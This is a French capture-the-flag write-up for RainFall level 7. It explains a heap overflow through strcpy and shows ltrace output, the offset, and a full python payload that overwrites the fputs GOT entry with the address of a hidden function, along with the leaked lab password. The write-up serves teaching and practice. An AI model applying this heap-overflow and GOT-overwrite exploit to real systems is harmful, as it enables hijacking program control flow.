Ici on a un programme qui appelle quatre fois `malloc` pour allouer 8 bytes.
Ils sont groupes deux par deux de la meme facon:
1. `void *x = malloc(8)`
2. `x[0] = 0x1 (ou 0x2 dans le 2e cas)`
3. `x[1] = malloc(8)`

Ensuite plus loin il y a deux strcpy.
Le premier copie `argv[1]` dans `x1[1]`
Le deuxieme copie `argv[2]` dans `x2[1]`

On va pouvoir overflow le premier strcpy dans le deuxieme strcpy.
Pour trouver l'offset j'ai test avec ltrace quelque chose comme ca:
```bash
level7@RainFall:~$ ltrace ./level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ BBBB
__libc_start_main(0x8048521, 3, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                                                                                                     = 0x0804a008
malloc(8)                                                                                                                                                                     = 0x0804a018
malloc(8)                                                                                                                                                                     = 0x0804a028
malloc(8)                                                                                                                                                                     = 0x0804a038
strcpy(0x0804a018, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"...)                                                                                                                     = 0x0804a018
strcpy(0x46464646, "BBBB" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
On voit que le deuxieme strcpy commence a copier dans l'addresse `0x46464646` = FFFF en ascii.
Donc l'offset est de `20`.

Encore plus loin, on voit un `fopen` qui ouvre le .pass du level suivant,  
suivi d'un `fgets` qui lit le fichier et enfin d'un `fputs` mais dont l'appel est incorrect (il manque un argument)

Aussi on voit une fonction `m` qui n'est jamais appelee.
Cette fonction affiche le contenu de l'addresse memoire ou se trouve le mot de passe.

On va donc vouloir appeler la fonction `m` a la place de `fputs` pour obtenir le mot de passe.

Dans le `.plt` je vois que l'addresse de `fputs` est `0x08049928`  
D'autre part je vois que celle de `m` est `0x080484f4`.

Ainsi on peut definir notre exploit:

arg1: `python -c "print 'A'*20 + '\x28\x99\x04\x08'"`
arg2: `python -c "print '\xf4\x84\x04\x08'"`

```bash
level7@RainFall:~$ ./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1726512326
```